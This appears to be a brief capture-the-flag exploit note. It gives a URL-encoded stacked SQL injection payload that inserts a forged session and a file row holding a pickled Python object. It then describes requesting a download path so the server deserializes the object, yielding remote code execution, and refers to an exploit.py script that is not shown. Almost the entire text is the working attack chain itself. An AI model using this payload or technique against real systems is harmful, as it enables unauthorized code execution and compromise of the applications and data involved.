The SQLI 2 payloads + serialized pickled python object to RCE:
\;%0AINSERT%0AOR%0AIGNORE%0AINTO%0Aactivesessions%0A(sessionid,%0Ausername,%0Atimestamp)%0AVALUES%0A(\TESTCTF\,%0A\TESTCTF\,%0A\TESTCTF\);%0AINSERT%0AINTO%0Afiles%0A(filename,%0Adata,%0Asessionid)%0AVALUES%0A(\\{filename}\,%0A\\{pickled}\,%0A\TESTCTF\\);--

then go into /download/{filename}/{sessionid} path with the injected sessionid and the filename and the object will get desirialized

script available on exploit.py
